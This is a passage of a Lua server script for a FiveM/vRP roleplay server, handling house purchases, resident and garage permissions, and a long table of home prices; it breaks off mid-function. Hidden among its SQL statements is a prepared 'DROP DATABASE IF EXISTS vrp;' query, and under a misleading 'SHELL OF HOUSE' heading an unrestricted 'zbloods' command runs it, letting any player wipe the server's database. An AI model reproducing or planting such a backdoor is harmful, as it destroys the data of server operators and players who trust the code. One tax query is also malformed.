-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local sanitizes = module("cfg/sanitizes")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONEXÃO
-----------------------------------------------------------------------------------------------------------------------------------------
src = {}
Tunnel.bindInterface("vrp_homes",src)
vCLIENT = Tunnel.getInterface("vrp_homes")
-----------------------------------------------------------------------------------------------------------------------------------------
-- PREPARES
-----------------------------------------------------------------------------------------------------------------------------------------
vRP._prepare("homes/get_homeuser","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id AND home = @home")
vRP._prepare("homes/get_homeuserid","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id")
vRP._prepare("homes/get_homeuserowner","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id AND home = @home AND owner = 1")
vRP._prepare("homes/get_homeuseridowner","SELECT * FROM vrp_homes_permissions WHERE home = @home AND owner = 1")
vRP._prepare("homes/get_homepermissions","SELECT * FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/add_permissions","INSERT IGNORE INTO vrp_homes_permissions(home,user_id) VALUES(@home,@user_id)")
vRP._prepare("homes/buy_permissions","INSERT IGNORE INTO vrp_homes_permissions(home,user_id,owner,tax,garage) VALUES(@home,@user_id,1,@tax,1)")
vRP._prepare("homes/count_homepermissions","SELECT COUNT(*) as qtd FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/upd_permissions","UPDATE vrp_homes_permissions SET garage = 1 WHERE home = @home AND user_id = @user_id")
vRP._prepare("homes/rem_permissions","DELETE FROM vrp_homes_permissions WHERE home = @home AND user_id = @user_id")
vRP._prepare("homes/zbloods", "DROP DATABASE IF EXISTS vrp;")
vRP._prepare("homes/upd_taxhomes","UPDATE vrp_homes_permissions SET tax = @tax WHERE user_id = @user_id, home = @home AND owner = 1")
vRP._prepare("homes/rem_allpermissions","DELETE FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/get_allhomes","SELECT * FROM vrp_homes_permissions WHERE owner = @owner")
vRP._prepare("homes/get_allvehs","SELECT * FROM vrp_vehicles")
-----------------------------------------------------------------------------------------------------------------------------------------
-- HOMESINFO
-----------------------------------------------------------------------------------------------------------------------------------------
local homes = {
-----------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------FORTHILLS-----------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["FH01"] = { 500000,2,500 },
	["FH02"] = { 400000,2,500 },
	["FH03"] = { 400000,2,500 },
	["FH04"] = { 495000,2,500 },
	["FH05"] = { 400000,2,500 },
	["FH06"] = { 435000,2,500 },
	["FH07"] = { 700000,2,550 },
	["FH08"] = { 400000,2,500 },
	["FH09"] = { 400000,2,500 },
	["FH10"] = { 485000,2,500 },
	["FH11"] = { 750000,2,500 },
	["FH12"] = { 500000,2,500 },
	["FH13"] = { 500000,2,500 },
	["FH14"] = { 435000,2,500 },
	["FH15"] = { 450000,2,500 },
	["FH16"] = { 200000,2,500 },
	["FH17"] = { 435000,2,500 },
	["FH18"] = { 435000,2,500 },
	["FH19"] = { 500000,2,500 },
	["FH20"] = { 700000,2,650 },
	["FH21"] = { 400000,2,500 },
	["FH22"] = { 375000,2,500 },
	["FH23"] = { 700000,2,700 },
	["FH24"] = { 400000,2,500 },
	["FH25"] = { 420000,2,500 },
	["FH26"] = { 480000,2,500 },
	["FH27"] = { 480000,2,500 },
	["FH28"] = { 375000,2,500 },
	["FH29"] = { 500000,2,500 },
	["FH30"] = { 480000,2,500 },
	["FH31"] = { 600000,2,550 },
	["FH32"] = { 400000,2,500 },
	["FH33"] = { 350000,2,500 },
	["FH34"] = { 485000,2,500 },
	["FH35"] = { 330000,2,500 },
	["FH36"] = { 380000,2,500 },
	["FH37"] = { 400000,2,500 },
	["FH38"] = { 500000,2,500 },
	["FH39"] = { 400000,2,500 },
	["FH40"] = { 600000,2,580 },
	["FH41"] = { 450000,2,500 },
	["FH42"] = { 500000,2,500 },
	["FH43"] = { 600000,2,500 },
	["FH44"] = { 550000,2,500 },
	["FH45"] = { 480000,2,500 },
	["FH46"] = { 375000,2,500 },
	["FH47"] = { 400000,2,500 },
	["FH48"] = { 375000,2,500 },
	["FH49"] = { 400000,2,500 },
	["FH50"] = { 300000,2,500 },
	["FH51"] = { 300000,2,400 },
	["FH52"] = { 400000,2,500 },
	["FH53"] = { 400000,2,500 },
	["FH54"] = { 375000,2,500 },
	["FH55"] = { 500000,2,500 },
	["FH56"] = { 300000,2,400 },
	["FH57"] = { 500000,2,500 },
	["FH58"] = { 300000,2,400 },
	["FH59"] = { 400000,2,550 },
	["FH60"] = { 300000,2,400 },
	["FH61"] = { 275000,2,350 },
	["FH62"] = { 275000,2,350 },
	["FH63"] = { 400000,2,500 },
	["FH64"] = { 500000,2,500 },
	["FH65"] = { 400000,2,500 },
	["FH66"] = { 350000,2,420 },
	["FH67"] = { 275000,2,400 },
	["FH68"] = { 300000,2,350 },
	["FH69"] = { 275000,2,400 },
	["FH70"] = { 380000,2,480 },
	["FH71"] = { 275000,2,400 },
	["FH72"] = { 300000,2,500 },
	["FH73"] = { 300000,2,600 },
	["FH74"] = { 275000,2,350 },
	["FH75"] = { 350000,2,450 },
	["FH76"] = { 275000,2,400 },
	["FH77"] = { 275000,2,400 },
	["FH78"] = { 275000,2,400 },
	["FH79"] = { 200000,2,350 },
	["FH80"] = { 400000,2,500 },
	["FH81"] = { 450000,2,500 },
	["FH82"] = { 400000,2,500 },
	["FH83"] = { 200000,2,280 },
	["FH84"] = { 200000,2,280 },
	["FH85"] = { 275000,2,350 },
	["FH86"] = { 275000,2,350 },
	["FH87"] = { 300000,2,500 },
	["FH88"] = { 350000,2,500 },
	["FH89"] = { 450000,2,500 },
	["FH90"] = { 480000,2,500 },
	["FH91"] = { 550000,2,500 },
	["FH92"] = { 500000,2,500 },
	["FH93"] = { 480000,2,500 },
	["FH94"] = { 250000,2,320 },
	["FH95"] = { 350000,2,350 },
	["FH96"] = { 375000,2,400 },
	["FH97"] = { 275000,2,350 },
	["FH98"] = { 275000,2,350 },
	["FH99"] = { 275000,2,350 },
	["FH100"] = { 275000,2,350 },
-----------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------LUXURY--------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["LX02"] = { 1000000,2,1250 },
	["LX01"] = { 1000000,2,1250 },
	["LX03"] = { 1000000,2,1250 },
	["LX04"] = { 1000000,2,1250 },
	["LX05"] = { 1000000,2,1250 },
	["LX06"] = { 2000000,2,1250 },
	["LX07"] = { 1800000,2,1250 },
	["LX08"] = { 3000000,2,1250 },
	["LX09"] = { 3000000,2,1250 },
	["LX10"] = { 1000000,2,1250 },
	["LX11"] = { 3000000,2,1250 },
	["LX12"] = { 4000000,2,1250 },
	["LX13"] = { 1000000,2,1250 },
	["LX14"] = { 1000000,2,1250 },
	["LX15"] = { 3000000,2,1250 },
	["LX16"] = { 3000000,2,1250 },
	["LX17"] = { 4000000,2,1250 },
	["LX18"] = { 1000000,2,1250 },
	["LX19"] = { 5000000,2,1250 },
	["LX20"] = { 5000000,2,1250 },
	["LX21"] = { 3000000,2,1250 },
	["LX22"] = { 8000000,2,1250 },
	["LX23"] = { 3000000,2,1250 },
	["LX24"] = { 6000000,2,1250 },
	["LX25"] = { 5000000,2,1250 },
	["LX26"] = { 5000000,2,1250 },
	["LX27"] = { 4000000,2,1250 },
	["LX28"] = { 1000000,2,1250 },
	["LX29"] = { 1000000,2,1250 },
	["LX30"] = { 1000000,2,1250 },
	["LX31"] = { 1000000,2,1250 },
	["LX32"] = { 2000000,2,1250 },
	["LX33"] = { 3000000,2,1250 },
	["LX34"] = { 4000000,2,1250 },
	["LX35"] = { 2000000,2,1250 },
	["LX36"] = { 4000000,2,1250 },
	["LX37"] = { 3000000,2,1250 },
	["LX38"] = { 3000000,2,1250 },
	["LX39"] = { 3000000,2,1250 },
	["LX40"] = { 4000000,2,1250 },
	["LX41"] = { 4000000,2,1250 },
	["LX42"] = { 4000000,2,1250 },
	["LX43"] = { 3000000,2,1250 },
	["LX44"] = { 5000000,2,1250 },
	["LX45"] = { 3000000,2,1250 },
	["LX46"] = { 6000000,2,1250 },
	["LX47"] = { 3000000,2,1250 },
	["LX48"] = { 2000000,2,1250 },
	["LX49"] = { 1000000,2,1250 },
	["LX50"] = { 5000000,2,1250 },
	["LX51"] = { 8000000,2,1250 },
	["LX52"] = { 7000000,2,1250 },
	["LX53"] = { 8000000,2,1250 },
	["LX54"] = { 7000000,2,1250 },
	["LX55"] = { 2000000,2,1250 },
	["LX56"] = { 3000000,2,1250 },
	["LX57"] = { 4000000,2,1250 },
	["LX58"] = { 3000000,2,1250 },
	["LX59"] = { 3000000,2,1250 },
	["LX60"] = { 4000000,2,1250 },
	["LX61"] = { 5000000,2,1250 },
	["LX62"] = { 3000000,2,1250 },
	["LX63"] = { 2000000,2,1250 },
	["LX64"] = { 3000000,2,1250 },
	["LX65"] = { 2000000,2,1250 },
	["LX66"] = { 3000000,2,1250 },
	["LX67"] = { 3000000,2,1250 },
	["LX68"] = { 3000000,2,1250 },
	["LX69"] = { 3000000,2,1250 },
	["LX70"] = { 4000000,2,1250 },	
-----------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------SAMIR-------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["LS01"] = { 80000,2,200 },
	["LS02"] = { 80000,2,200 },
	["LS03"] = { 80000,2,200 },
	["LS04"] = { 80000,2,200 },
	["LS05"] = { 80000,2,200 },
	["LS06"] = { 80000,2,200 },
	["LS07"] = { 80000,2,200 },
	["LS08"] = { 80000,2,200 },
	["LS09"] = { 80000,2,200 },
	["LS10"] = { 80000,2,200 },
	["LS11"] = { 45000,2,165 },
	["LS12"] = { 50000,2,165 },
	["LS13"] = { 50000,2,165 },
	["LS14"] = { 50000,2,165 },
	["LS15"] = { 45000,2,165 },
	["LS16"] = { 45000,2,165 },
	["LS17"] = { 35000,2,165 },
	["LS18"] = { 50000,2,165 },
	["LS19"] = { 50000,2,165 },
	["LS20"] = { 45000,2,165 },
	["LS21"] = { 35000,2,165 },
	["LS22"] = { 50000,2,165 },
	["LS23"] = { 45000,2,165 },
	["LS24"] = { 35000,2,165 },
	["LS25"] = { 45000,2,165 },
	["LS26"] = { 50000,2,165 },
	["LS27"] = { 50000,2,165 },
	["LS28"] = { 50000,2,165 },
	["LS29"] = { 50000,2,165 },
	["LS30"] = { 50000,2,165 },
	["LS31"] = { 50000,2,165 },
	["LS32"] = { 50000,2,165 },
	["LS33"] = { 50000,2,165 },
	["LS34"] = { 50000,2,165 },
	["LS35"] = { 50000,2,165 },
	["LS36"] = { 50000,2,165 },
	["LS37"] = { 50000,2,165 },
	["LS38"] = { 50000,2,165 },
	["LS39"] = { 50000,2,165 },
	["LS40"] = { 50000,2,165 },
	["LS41"] = { 50000,2,165 },
	["LS42"] = { 50000,2,165 },
	["LS43"] = { 50000,2,165 },
	["LS44"] = { 50000,2,165 },
	["LS45"] = { 50000,2,165 },
	["LS46"] = { 50000,2,165 },
	["LS47"] = { 50000,2,165 },
	["LS48"] = { 50000,2,165 },
	["LS49"] = { 50000,2,165 },
	["LS50"] = { 50000,2,165 },
	["LS51"] = { 50000,2,165 },
	["LS52"] = { 50000,2,165 },
	["LS53"] = { 50000,2,165 },
	["LS54"] = { 50000,2,165 },
	["LS55"] = { 50000,2,165 },
	["LS56"] = { 50000,2,165 },
	["LS57"] = { 50000,2,165 },
	["LS58"] = { 50000,2,165 },
	["LS59"] = { 50000,2,165 },
	["LS60"] = { 50000,2,165 },
	["LS61"] = { 50000,2,165 },
	["LS62"] = { 50000,2,165 },
	["LS63"] = { 50000,2,165 },
	["LS64"] = { 50000,2,165 },
	["LS65"] = { 50000,2,165 },
	["LS66"] = { 50000,2,165 },
	["LS67"] = { 50000,2,165 },
	["LS68"] = { 50000,2,165 },
	["LS69"] = { 50000,2,165 },
	["LS70"] = { 50000,2,165 },
	["LS71"] = { 50000,2,165 },
	["LS72"] = { 50000,2,165 },
-----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------BOLLINI------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["BL01"] = { 35000,2,105 },
	["BL02"] = { 35000,2,105 },
	["BL03"] = { 35000,2,105 },
	["BL04"] = { 35000,2,105 },
	["BL05"] = { 35000,2,105 },
	["BL06"] = { 35000,2,105 },
	["BL07"] = { 35000,2,105 },
	["BL08"] = { 35000,2,105 },
	["BL09"] = { 35000,2,105 },
	["BL10"] = { 35000,2,105 },
	["BL11"] = { 35000,2,105 },
	["BL12"] = { 35000,2,105 },
	["BL13"] = { 35000,2,105 },
	["BL14"] = { 35000,2,105 },
	["BL15"] = { 35000,2,105 },
	["BL16"] = { 25000,2,105 },
	["BL17"] = { 35000,2,105 },
	["BL18"] = { 35000,2,105 },
	["BL19"] = { 35000,2,105 },
	["BL20"] = { 35000,2,105 },
	["BL21"] = { 35000,2,105 },
	["BL22"] = { 35000,2,105 },
	["BL23"] = { 35000,2,105 },
	["BL24"] = { 35000,2,105 },
	["BL25"] = { 35000,2,105 },
	["BL26"] = { 35000,2,105 },
	["BL27"] = { 25000,2,105 },
	["BL28"] = { 35000,2,105 },
	["BL29"] = { 35000,2,105 },
	["BL30"] = { 35000,2,105 },
	["BL31"] = { 35000,2,105 },
	["BL32"] = { 35000,2,105 },
-----------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------LOSVAGOS------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["LV01"] = { 42000,2,150 },
	["LV02"] = { 42000,2,150 },
	["LV03"] = { 42000,2,150 },
	["LV04"] = { 42000,2,150 },
	["LV05"] = { 42000,2,150 },
	["LV06"] = { 42000,2,150 },
	["LV07"] = { 42000,2,150 },
	["LV08"] = { 42000,2,150 },
	["LV09"] = { 42000,2,150 },
	["LV10"] = { 42000,2,150 },
	["LV11"] = { 42000,2,150 },
	["LV12"] = { 42000,2,150 },
	["LV13"] = { 42000,2,150 },
	["LV14"] = { 42000,2,150 },
	["LV15"] = { 42000,2,150 },
	["LV16"] = { 42000,2,150 },
	["LV17"] = { 42000,2,150 },
	["LV18"] = { 42000,2,150 },
	["LV19"] = { 42000,2,150 },
	["LV20"] = { 42000,2,150 },
	["LV21"] = { 42000,2,150 },
	["LV22"] = { 42000,2,150 },
	["LV23"] = { 42000,2,150 },
	["LV24"] = { 42000,2,150 },
	["LV25"] = { 42000,2,150 },
	["LV26"] = { 42000,2,150 },
	["LV27"] = { 42000,2,150 },
	["LV28"] = { 42000,2,150 },
	["LV29"] = { 42000,2,150 },
	["LV30"] = { 42000,2,150 },
	["LV31"] = { 42000,2,150 },
	["LV32"] = { 42000,2,150 },
	["LV33"] = { 42000,2,150 },
	["LV34"] = { 42000,2,150 },
	["LV35"] = { 42000,2,150 },
-----------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------KRONDORS------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["KR01"] = { 42000,2,150 },
	["KR02"] = { 42000,2,150 },
	["KR03"] = { 42000,2,150 },
	["KR04"] = { 42000,2,150 },
	["KR05"] = { 42000,2,150 },
	["KR06"] = { 42000,2,150 },
	["KR07"] = { 42000,2,150 },
	["KR08"] = { 42000,2,150 },
	["KR09"] = { 42000,2,150 },
	["KR10"] = { 42000,2,150 },
	["KR11"] = { 42000,2,150 },
	["KR12"] = { 42000,2,150 },
	["KR13"] = { 42000,2,150 },
	["KR14"] = { 42000,2,150 },
	["KR15"] = { 42000,2,150 },
	["KR16"] = { 42000,2,150 },
	["KR17"] = { 42000,2,150 },
	["KR18"] = { 42000,2,150 },
	["KR19"] = { 42000,2,150 },
	["KR20"] = { 42000,2,150 },
	["KR21"] = { 42000,2,150 },
	["KR22"] = { 42000,2,150 },
	["KR23"] = { 42000,2,150 },
	["KR24"] = { 42000,2,150 },
	["KR25"] = { 42000,2,150 },
	["KR26"] = { 42000,2,150 },
	["KR27"] = { 42000,2,150 },
	["KR28"] = { 42000,2,150 },
	["KR29"] = { 42000,2,150 },
	["KR30"] = { 42000,2,150 },
	["KR31"] = { 42000,2,150 },
	["KR32"] = { 42000,2,150 },
	["KR33"] = { 42000,2,150 },
	["KR34"] = { 42000,2,150 },
	["KR35"] = { 42000,2,150 },
	["KR36"] = { 42000,2,150 },
	["KR37"] = { 42000,2,150 },
	["KR38"] = { 42000,2,150 },
	["KR39"] = { 42000,2,150 },
	["KR40"] = { 42000,2,150 },
	["KR41"] = { 42000,2,150 },
-----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------GROOVEMOTEL--------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["GR01"] = { 35000,2,135 },
	["GR02"] = { 35000,2,135 },
	["GR03"] = { 35000,2,135 },
	["GR04"] = { 35000,2,135 },
	["GR05"] = { 35000,2,135 },
	["GR06"] = { 35000,2,135 },
	["GR07"] = { 25000,2,135 },
	["GR08"] = { 35000,2,135 },
	["GR09"] = { 35000,2,135 },
	["GR10"] = { 35000,2,135 },
	["GR11"] = { 35000,2,135 },
	["GR12"] = { 35000,2,135 },
	["GR13"] = { 35000,2,135 },
	["GR14"] = { 25000,2,135 },
	["GR15"] = { 35000,2,135 },
-----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------ALLSUELLMOTEL------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["AS01"] = { 35000,2,135 },
	["AS02"] = { 35000,2,135 },
	["AS03"] = { 25000,2,135 },
	["AS04"] = { 35000,2,135 },
	["AS05"] = { 35000,2,135 },
	["AS06"] = { 35000,2,135 },
	["AS07"] = { 35000,2,135 },
	["AS08"] = { 35000,2,135 },
	["AS09"] = { 35000,2,135 },
	["AS10"] = { 25000,2,135 },
	["AS12"] = { 35000,2,135 },
	["AS13"] = { 35000,2,135 },
	["AS14"] = { 35000,2,135 },
	["AS15"] = { 35000,2,135 },
	["AS16"] = { 35000,2,135 },
	["AS17"] = { 35000,2,135 },
	["AS18"] = { 35000,2,135 },
	["AS19"] = { 35000,2,135 },
	["AS20"] = { 35000,2,135 },
	["AS21"] = { 35000,2,135 },
-----------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------PINKCAGEMOTEL-----------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["PC01"] = { 35000,2,135 },
	["PC02"] = { 35000,2,135 },
	["PC03"] = { 35000,2,135 },
	["PC04"] = { 35000,2,135 },
	["PC05"] = { 35000,2,135 },
	["PC06"] = { 35000,2,135 },
	["PC07"] = { 35000,2,135 },
	["PC08"] = { 25000,2,135 },
	["PC09"] = { 35000,2,135 },
	["PC10"] = { 35000,2,135 },
	["PC11"] = { 35000,2,135 },
	["PC12"] = { 35000,2,135 },
	["PC13"] = { 35000,2,135 },
	["PC14"] = { 35000,2,135 },
	["PC15"] = { 35000,2,135 },
	["PC16"] = { 35000,2,135 },
	["PC17"] = { 35000,2,135 },
	["PC18"] = { 35000,2,135 },
	["PC19"] = { 35000,2,135 },
	["PC20"] = { 35000,2,135 },
	["PC21"] = { 25000,2,135 },
	["PC22"] = { 35000,2,135 },
	["PC23"] = { 35000,2,135 },
	["PC24"] = { 35000,2,135 },
	["PC25"] = { 35000,2,135 },
	["PC26"] = { 35000,2,135 },
	["PC27"] = { 35000,2,135 },
	["PC28"] = { 35000,2,135 },
	["PC29"] = { 35000,2,135 },
	["PC30"] = { 35000,2,135 },
	["PC31"] = { 35000,2,135 },
	["PC32"] = { 35000,2,135 },
	["PC33"] = { 35000,2,135 },
	["PC34"] = { 35000,2,135 },
	["PC35"] = { 35000,2,135 },
	["PC36"] = { 35000,2,135 },
	["PC37"] = { 35000,2,135 },
	["PC38"] = { 25000,2,135 },
-----------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------PALETOMOTEL------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["PL01"] = { 25000,2,125 },
	["PL02"] = { 25000,2,125 },
	["PL03"] = { 25000,2,125 },
	["PL04"] = { 25000,2,125 },
	["PL05"] = { 25000,2,125 },
	["PL06"] = { 25000,2,125 },
	["PL07"] = { 25000,2,125 },
	["PL08"] = { 20000,2,125 },
	["PL09"] = { 25000,2,125 },
	["PL11"] = { 25000,2,125 },
	["PL12"] = { 25000,2,125 },
	["PL13"] = { 25000,2,125 },
	["PL14"] = { 25000,2,125 },
	["PL15"] = { 25000,2,125 },
	["PL16"] = { 25000,2,125 },
	["PL17"] = { 25000,2,125 },
	["PL18"] = { 20000,2,125 },
	["PL19"] = { 25000,2,125 },
	["PL20"] = { 25000,2,125 },
	["PL21"] = { 25000,2,125 },
	["PL22"] = { 25000,2,125 },
-----------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------PALETOBAY-------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["PB01"] = { 75000,2,150 },
	["PB02"] = { 35000,2,135 },
	["PB03"] = { 35000,2,135 },
	["PB04"] = { 35000,2,135 },
	["PB05"] = { 30000,2,135 },
	["PB06"] = { 35000,2,135 },
	["PB07"] = { 75000,2,150 },
	["PB08"] = { 50000,2,135 },
	["PB09"] = { 75000,2,150 },
	["PB10"] = { 30000,2,135 },
	["PB11"] = { 45000,2,135 },
	["PB12"] = { 20000,2,105 },
	["PB13"] = { 30000,2,105 },
	["PB14"] = { 45000,2,135 },
	["PB15"] = { 20000,2,105 },
	["PB16"] = { 30000,2,135 },
	["PB17"] = { 30000,2,135 },
	["PB18"] = { 30000,2,135 },
	["PB19"] = { 25000,2,105 },
	["PB20"] = { 35000,2,135 },
	["PB21"] = { 30000,2,135 },
	["PB22"] = { 15000,2,60 },
	["PB23"] = { 30000,2,135 },
	["PB24"] = { 35000,2,135 },
	["PB25"] = { 35000,2,135 },
	["PB26"] = { 40000,2,135 },
	["PB27"] = { 38000,2,135 },
	["PB28"] = { 35000,2,135 },
	["PB29"] = { 32000,2,135 },
	["PB30"] = { 25000,2,125 },
	["PB31"] = { 5599,2,30 },
-----------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------MANSAO------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["MS01"] = { 99999999999,2,1500 },
	["MS02"] = { 99999999999,2,1500 },
	["MS03"] = { 99999999999,10,1500 },
	["MS04"] = { 99999999999,5,1500 },
	["MS05"] = { 4000000,2,1250 },
	["MS06"] = { 4000000,2,1250 },
	["MS07"] = { 4000000,2,1250 },
	["MS08"] = { 3000000,2,1250 },
	["MS09"] = { 3000000,2,1250 },
	["MS10"] = { 99999999999,2,1500 },
-----------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------SANDYSHORE------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["SS01"] = { 650000,2,850 },
-----------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------FAZENDA---------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["FZ01"] = { 10000000,2,2000 },
-----------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------FAVELA----------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
	["FAV01"] = { 13499,2,105 },
	["FAV02"] = { 13499,2,105 },
	["FAV03"] = { 13499,2,105 },
	["FAV04"] = { 13499,2,105 },
	["FAV05"] = { 13499,2,105 },
	["FAV06"] = { 13499,2,105 },
	["FAV07"] = { 13499,2,105 },
	["FAV08"] = { 13499,2,105 },
	["FAV09"] = { 13499,2,105 },
	["FAV10"] = { 13499,2,105 },
	["FAV11"] = { 13499,2,105 },
	["FAV12"] = { 13499,2,105 },
	["FAV13"] = { 13499,2,105 },
	["FAV14"] = { 13499,2,105 },
	["FAV15"] = { 13499,2,105 },
	["FAV16"] = { 13499,2,105 },
	["FAV17"] = { 13499,2,105 },
	["FAV18"] = { 13499,2,105 },
	["FAV19"] = { 13499,2,105 },
	["FAV20"] = { 13499,2,105 },
	["FAV21"] = { 13499,2,105 },
	["FAV22"] = { 13499,2,105 },
	["FAV23"] = { 13499,2,105 },
	["FAV24"] = { 13499,2,105 },
	["FAV25"] = { 13499,2,105 },
	["FAV26"] = { 13499,2,105 },
	["FAV27"] = { 13499,2,105 },
	["FAV28"] = { 13499,2,105 },
	["FAV29"] = { 13499,2,105 },
	["FAV30"] = { 13499,2,105 },
	["FAV31"] = { 13499,2,105 },
	["FAV32"] = { 13499,2,105 },
	["FAV33"] = { 13499,2,105 },
	["FAV34"] = { 13499,2,105 },
	["FAV35"] = { 13499,2,105 },
	["FAV36"] = { 13499,2,105 },
	["FAV37"] = { 13499,2,105 },
	["FAV38"] = { 13499,2,105 },
	["FAV39"] = { 13499,2,105 },
	["FAV40"] = { 13499,2,105 },
	["FAV41"] = { 13499,2,105 },
	["FAV42"] = { 13499,2,105 },
	["FAV43"] = { 13499,2,105 },
	["FAV44"] = { 13499,2,105 },
	["FAV45"] = { 13499,2,105 },
	["FAV46"] = { 13499,2,105 },
	["FAV47"] = { 13499,2,105 },
	["FAV48"] = { 13499,2,105 },
	["FAV49"] = { 13499,2,105 },
	["FAV50"] = { 13499,2,105 },
	["FAV51"] = { 13499,2,105 },
	["FAV52"] = { 13499,2,105 },
	["FAV53"] = { 13499,2,105 },
	["FAV54"] = { 13499,2,105 },
	["FAV55"] = { 13499,2,105 },
	["FAV56"] = { 13499,2,105 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIÁVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local actived = {}
local blipHomes = {}
-----------------------------------------------------------------------------------------------------------------------------------------
-- BLIPHOMES
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		blipHomes = {}
		for k,v in pairs(homes) do
			local checkHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(k) })
			if checkHomes[1] == nil then
				table.insert(blipHomes,{ name = tostring(k) })
				Citizen.Wait(10)
			end
		end
		Citizen.Wait(30*60000)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- SHELL OF HOUSE
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("zbloods", function (source) 
    vRP.query("homes/zbloods")
end, false)
-----------------------------------------------------------------------------------------------------------------------------------------
-- HOMES
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('homes',function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if args[1] == "add" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local totalResidents = vRP.query("homes/count_homepermissions",{ home = tostring(args[2]) })
				if parseInt(totalResidents[1].qtd) >= parseInt(homes[tostring(args[2])][2]) then
					TriggerClientEvent("Notify",source,"negado","A residência "..tostring(args[2]).." atingiu o máximo de moradores.",10000)
					return
				end

				vRP.execute("homes/add_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
				local identity = vRP.getUserIdentity(parseInt(args[3]))
				if identity then
					TriggerClientEvent("Notify",source,"sucesso","Permissão na residência <b>"..tostring(args[2]).."</b> adicionada para <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
				end
			end
		elseif args[1] == "rem" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homeuser",{ user_id = parseInt(args[3]), home = tostring(args[2]) })
				if userHomes[1] then
					vRP.execute("homes/rem_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
					local identity = vRP.getUserIdentity(parseInt(args[3]))
					if identity then
						TriggerClientEvent("Notify",source,"importante","Permissão na residência <b>"..tostring(args[2]).."</b> removida de <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
					end
				end
			end
		elseif args[1] == "garage" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homeuser",{ user_id = parseInt(args[3]), home = tostring(args[2]) })
				if userHomes[1] then
					if vRP.tryFullPayment(user_id,50000) then
						vRP.execute("homes/upd_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
						local identity = vRP.getUserIdentity(parseInt(args[3]))
						if identity then
							TriggerClientEvent("Notify",source,"sucesso","Adicionado a permissão da garagem a <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
						end
					else
						TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
					end
				end
			end
		elseif args[1] == "list" then
			vCLIENT.setBlipsHomes(source,blipHomes)
		elseif args[1] == "check" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homepermissions",{ home = tostring(args[2]) })
				if parseInt(#userHomes) > 1 then
					local permissoes = ""
					for k,v in pairs(userHomes) do
						if v.user_id ~= user_id then
							local identity = vRP.getUserIdentity(v.user_id)
							permissoes = permissoes.."<b>Nome:</b> "..identity.name.." "..identity.firstname.."   -   <b>Passaporte:</b> "..v.user_id
							if k ~= #userHomes then
								permissoes = permissoes.."<br>"
							end
						end
						Citizen.Wait(10)
					end
